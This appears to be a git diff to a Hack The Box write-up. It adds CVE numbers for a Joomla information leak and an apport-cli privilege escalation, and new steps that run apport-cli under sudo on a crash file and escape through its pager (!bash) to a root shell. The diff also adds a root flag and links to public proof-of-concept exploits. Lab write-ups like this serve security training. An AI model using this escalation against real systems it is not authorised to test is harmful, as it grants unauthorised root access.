@@ -4,10 +4,10 @@
 ## Lesson Learned:
 - Enumerating subdomain using ffuf.
 - Directory listing using dirsearch.
-- Exploiting CMS Joomla v4.2.
+- Exploiting CMS Joomla v4.2 --> CVE-2023-23752.
 - Accessing mysql (inline command).
 - Cracking password using john.
-- Exploiting apport-cli bin for privilege escalation.
+- Exploiting apport-cli bin for privilege escalation --> CVE-2023-1326.
 
 ![image](https://github.com/jon-brandy/hackthebox/assets/70703371/c8f39e13-398d-457a-9e4c-144fc3b34e35)
 
@@ -247,7 +247,47 @@ echo "Crashing the script"
 kill -SEGV $$
 ```
 
-![image](https://github.com/jon-brandy/hackthebox/assets/70703371/cc087547-0d59-4b0f-8f7b-5f4b1a024365)
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/d82bdf18-7a10-4a0a-bff9-6dd55709b0ab)
+
+
+> RESULT
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/dbff73f3-63a7-4341-be58-17a3ac793ddd)
+
+
+36. Nice! Let's run the same command as the github's POC.
+
+```
+sudo /usr/bin/apport-cli -c _var_crash_exp.sh.1000.crash
+
+1. type V.
+2. type !id.
+3. type !bash.
+```
+
+> RESULT 
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/e6f975d5-4b2c-4108-a08e-3b1e8edfa99f)
+
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/6a6a4cc5-7970-4424-9750-6505b6228a9e)
+
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/f71e046a-4b2b-45ba-88d8-e690e305b81f)
+
+
+37. We finally gained root!
+
+> GETTING ROOT FLAG
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/4bb0dac7-1682-4131-a9be-5213e40e9b6a)
+
+
+## ROOT FLAG
+
+```
+766364c845299c178b416e68f343dcea
+```
 
 
 
@@ -256,4 +296,5 @@ kill -SEGV $$
 ```
 https://github.com/Acceis/exploit-CVE-2023-23752
 https://www.exploit-db.com/exploits/51334
+https://github.com/diego-tella/CVE-2023-1326-PoC
 ```
